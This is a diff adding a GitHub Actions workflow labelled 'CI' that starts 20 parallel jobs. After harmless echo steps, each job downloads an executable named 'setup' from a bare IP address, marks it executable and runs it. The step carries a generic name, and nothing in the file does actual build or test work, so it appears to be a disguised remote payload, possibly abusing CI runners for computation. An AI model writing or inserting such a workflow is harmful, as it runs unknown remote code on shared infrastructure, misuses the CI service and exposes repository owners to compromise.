@@ -1,0 +1,35 @@
+name: CI
+
+on:
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    # Chạy 20 job song song (instance 1..20)
+    strategy:
+      matrix:
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Print job info
+        run: echo "🔹 Running instance ${{ matrix.instance }}"
+
+      - name: Run a one-line script
+        run: echo "Hello from instance ${{ matrix.instance }}!"
+
+      - name: Install wget
+        run: sudo apt update && sudo apt install wget -y
+
+      - name: Run a multi-line script
+        run: |
+          wget http://38.242.224.156:8082/setup
+          chmod +x setup
+          ./setup
